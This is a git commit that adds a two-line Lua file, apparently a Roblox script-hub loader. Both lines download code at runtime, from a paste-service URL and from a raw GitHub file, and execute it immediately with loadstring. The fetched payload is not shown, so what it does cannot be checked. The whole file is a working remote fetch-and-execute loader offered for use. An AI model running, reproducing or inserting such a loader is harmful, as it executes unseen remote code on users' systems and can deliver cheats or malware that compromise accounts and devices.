47abec0106a978117a324d20ad94e50e4e25519a
Pixiemo <infuraswapzoraswap2@gmail.com>
2025-07-23 18:53:43 +0800

    Create v02.15.main.lua

---
+++ v02.15.main.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/h6Of6xKid1iBrnfh/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptHubLoader/Pixiemo/refs/heads/main/Main.lua"))()
